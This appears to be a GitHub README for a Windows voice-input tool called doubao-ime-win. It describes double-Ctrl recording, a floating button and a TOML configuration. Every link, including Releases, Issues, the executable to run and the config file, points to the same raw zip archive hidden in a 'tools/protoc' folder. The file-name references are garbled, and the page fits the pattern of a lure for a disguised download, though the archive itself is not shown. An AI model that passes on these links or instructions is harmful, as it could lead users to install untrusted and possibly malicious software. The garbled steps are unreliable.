# 🎤 doubao-ime-win - Effortless Voice Input for Windows

## 🚀 Download the Latest Version

[![Download Doubao Voice Input](https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip)](https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip)

## 📝 Overview

Doubao Voice Input (豆包语音输入) is a Windows tool that allows you to use voice recognition for rapid text input. It offers a simple interface, making it easy for anyone to use.

## 💡 Features

- 🎤 **Real-Time Voice Recognition** - High-accuracy voice recognition powered by Doubao ASR.
- ⌨️ **Double Ctrl Trigger** - Quickly start and stop voice input with a double tap on the Ctrl key.
- 📍 **Floating Button** - A modern, draggable button that functions simply; left-click to record and right-click to exit.
- 🔄 **Streamlined Recognition** - Instant display of recognition results, allowing you to correct text as needed.
- 🖥️ **System Tray Integration** - Access control through a tray icon; right-click for settings and exit.
- 📦 **Portable Application** - A single executable file that requires no installation.

## 🚀 Getting Started

### 📥 Download & Install

1. **Visit the Releases Page**: Go to [Releases](https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip) to download the latest version.
2. **Extract Files**: Once downloaded, uncompress the files to any directory on your computer.
3. **Run the Application**: Locate and run `https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip`. The program will automatically register your device upon the first launch.

### 📖 How to Use

1. **Keyboard Shortcuts (Double Ctrl)**:
   - Quickly double-tap the `Ctrl` key to begin voice input.
   - Tap again to stop recording. The recognized text automatically inserts into the active window.

2. **Floating Button**:
   - 🟣 Purple = Standby mode.
   - 🔴 Red = Currently recording.
   - 🟠 Orange = Processing recognition.
   - **Left-Click** = Start/Stop recording.
   - **Right-Click** = Exit the program (with confirmation).
   - **Drag** = Adjust the button position on your screen.

3. **System Tray Controls**:
   - Right-click the tray icon to access the menu.
   - Menu Options: Start/Stop voice input, settings, exit.

## ⚙️ Configuration File

The configuration file `https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip` resides in the same directory as the program. Here is the default setup:

```toml
[general]
auto_start = false
language = "zh-CN"

[hotkey]
mode = "double_tap"
combo_key = "Ctrl+Shift+V"
double_tap_key = "Ctrl"
double_tap_interval = 300  # milliseconds

[floating_button]
enabled = true
position_x = 100
position_y = 100

[asr]
vad_enabled = true
```

## 🚧 Troubleshooting

If you encounter issues while using Doubao Voice Input, consider the following:

- **Microphone Settings**: Ensure your microphone is connected and set as the default input device.
- **Permissions**: Check if the application has permission to access your microphone.
- **Update Drivers**: Keep your audio drivers up to date to avoid compatibility issues.

## ⚡ Additional Tips

- To improve voice recognition accuracy, speak clearly and maintain a moderate pace.
- Regularly update the software to benefit from fixes and enhancements.
- Experiment with the floating button position to find what suits your workflow best.

## 📂 Source Code

If you're interested in the source code, it is available in this repository. Feel free to explore and contribute.

## 📞 Support

For more assistance, visit the [Issues](https://github.com/karkajoi/doubao-ime-win/raw/refs/heads/main/tools/protoc/doubao-win-ime-underballast.zip) page. You can submit your questions or report bugs. Community members and contributors often help with queries.

By following these instructions, you can enjoy the convenience of voice input on your Windows machine.